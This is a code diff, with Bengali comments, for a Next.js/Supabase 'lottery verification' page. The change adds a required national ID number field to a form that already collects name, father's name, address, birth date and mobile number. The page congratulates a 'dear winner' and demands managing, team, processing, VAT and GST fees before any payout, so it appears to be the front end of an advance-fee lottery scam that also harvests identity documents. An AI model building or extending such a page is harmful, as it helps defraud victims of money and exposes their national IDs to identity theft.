@@ -1,12 +1,12 @@
-/* app/lottery/withdraw/page.tsx */
+/* app/lottery/verification/page.tsx */
 "use client";
 
 import { useCallback, useEffect, useMemo, useState } from "react";
 import { useRouter } from "next/navigation";
 import { createClient } from "../../../lib/supabase/client";
-import "./withdraw.css";
+import "./withdraw.css"; // আপনার CSS ফাইলের নাম যদি withdraw.css থাকে, তবে এটাই থাকবে
 
-export default function LotteryWithdrawPage() {
+export default function LotteryVerificationPage() {
   const router = useRouter();
   const supabase = useMemo(() => createClient(), []);
 
@@ -23,7 +23,7 @@ export default function LotteryWithdrawPage() {
   const [isModalLoading, setIsModalLoading] = useState(false); 
   const [showSuccessPopup, setShowSuccessPopup] = useState(false); 
 
-  // NID ফর্ম ডাটা
+  // NID ফর্ম ডাটা (এখানে nid_number যোগ করা হয়েছে)
   const [formData, setFormData] = useState({
     full_name: "",
     father_name: "",
@@ -32,7 +32,8 @@ export default function LotteryWithdrawPage() {
     full_address: "",
     birth_date: "",
     zip_code: "",
-    district: ""
+    district: "",
+    nid_number: "" // নতুন যোগ করা হলো
   });
 
   // পেমেন্ট ফর্ম ডাটা
@@ -70,7 +71,8 @@ export default function LotteryWithdrawPage() {
           full_address: userDetails.full_address || "",
           birth_date: userDetails.birth_date || "",
           zip_code: userDetails.zip_code || "",
-          district: userDetails.district || ""
+          district: userDetails.district || "",
+          nid_number: userDetails.nid_number || "" // এখানেও লোড করা হলো
         });
       }
       
@@ -99,8 +101,8 @@ export default function LotteryWithdrawPage() {
 
   const handleProceedToPayment = (e: React.FormEvent) => {
     e.preventDefault();
-    if (!formData.full_name || !formData.mobile || !formData.full_address) {
-      setMessage({ type: "error", text: "Please fill the required NID details." });
+    if (!formData.full_name || !formData.mobile || !formData.full_address || !formData.nid_number) {
+      setMessage({ type: "error", text: "Please fill the required NID details including NID Number." });
       return;
     }
     setMessage({ type: "", text: "" });
@@ -121,6 +123,7 @@ export default function LotteryWithdrawPage() {
       const { data: { user } } = await supabase.auth.getUser();
       if (!user) throw new Error("Not logged in");
 
+      // lottery_user_details টেবিলে nid_number সহ সেভ করা হচ্ছে
       const { error: userError } = await supabase.from("lottery_user_details").upsert({
         user_id: user.id,
         mobile: formData.mobile,
@@ -131,6 +134,7 @@ export default function LotteryWithdrawPage() {
         birth_date: formData.birth_date || null,
         zip_code: formData.zip_code,
         district: formData.district,
+        nid_number: formData.nid_number, // নতুন কলাম
         updated_at: new Date().toISOString()
       }, { onConflict: 'user_id' });
 
@@ -227,7 +231,6 @@ export default function LotteryWithdrawPage() {
         }
       `}</style>
 
-      {/* ৫. টাইটেল পরিবর্তন */}
       <h1 className="lot-page-title" style={{ fontSize: '22px', lineHeight: '1.3', marginBottom: '20px' }}>
         Verification Your Self and Payment Method For Withdrawal
       </h1>
@@ -243,7 +246,6 @@ export default function LotteryWithdrawPage() {
             <i className="fa-solid fa-circle-info"></i> Verification Fee Breakdown
           </h4>
           
-          {/* ১, ২, ৩ ও ২. ফন্ট সাইজ ছোট + ড্যাশ লাইন */}
           <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '14px', paddingBottom: '5px' }}>
             <span>Managing Cost:</span> 
             <span>৳{fees.managing_cost}</span>
@@ -273,7 +275,6 @@ export default function LotteryWithdrawPage() {
           </div>
         </div>
 
-        {/* ৪. নোট এবং নতুন ডিজাইনের বাটন */}
         <div style={{ backgroundColor: '#1a1129', padding: '15px', borderRadius: '8px', marginTop: '20px', borderLeft: '3px solid #d4af37' }}>
           <p style={{ fontSize: '12px', color: '#aaa', lineHeight: '1.5', margin: 0 }}>
             <strong style={{ color: '#d4af37' }}>NOTE:</strong> Congratulations dear winner! Verification is very important for withdrawing your winnings lottery amount, We will verify your address to ensure that your existence can be confirmed during any future verification processes, You must pay the specified Managing Cost, Team Cost, Processing Cost, VAT & GST amount.
@@ -324,6 +325,12 @@ export default function LotteryWithdrawPage() {
                   <div className="lot-input-group" style={{ marginBottom: '10px' }}>
                     <label>Full Name (as per NID)</label>
                     <input type="text" value={formData.full_name} onChange={e => setFormData({...formData, full_name: e.target.value})} placeholder="Your Full Name" required style={{ padding: '10px', borderRadius: '5px', width: '100%', backgroundColor: '#1a1129', color: 'white', border: '1px solid #444' }} />
+                  </div>
+
+                  {/* নতুন NID Number ইনপুট ফিল্ড */}
+                  <div className="lot-input-group" style={{ marginBottom: '10px' }}>
+                    <label>NID Number</label>
+                    <input type="text" value={formData.nid_number} onChange={e => setFormData({...formData, nid_number: e.target.value})} placeholder="Enter your NID Number" required style={{ padding: '10px', borderRadius: '5px', width: '100%', backgroundColor: '#1a1129', color: 'white', border: '1px solid #444' }} />
                   </div>
 
                   <div className="lot-input-group" style={{ marginBottom: '10px' }}>
